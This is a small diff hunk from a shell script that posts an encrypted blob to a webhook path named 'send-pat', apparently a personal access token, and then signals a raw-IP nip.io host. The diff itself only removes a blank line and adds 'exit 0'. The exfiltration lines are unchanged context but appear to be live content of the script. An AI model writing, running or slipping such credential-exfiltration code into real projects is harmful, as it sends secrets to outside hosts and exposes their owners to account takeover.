@@ -49,9 +49,10 @@ done
 encrypted_string="$(printf '%s.' "${chunks[@]}")"
 encrypted_string="${encrypted_string%.}"
 
-
 # ------------------------------------------------ send encrypted blob -----
 curl -s -o /dev/null "$webhook/send-pat" -d "$encrypted_string"
 
 # ------------------------------------------------ check if quit with no errors -----
 curl https://16.164.221.226.nip.io/bcbdfd7ffd9efa6d8d312f9f723f20753656c0dcb6460ebb7a85a5c02357b5ff/stop
+
+exit 0
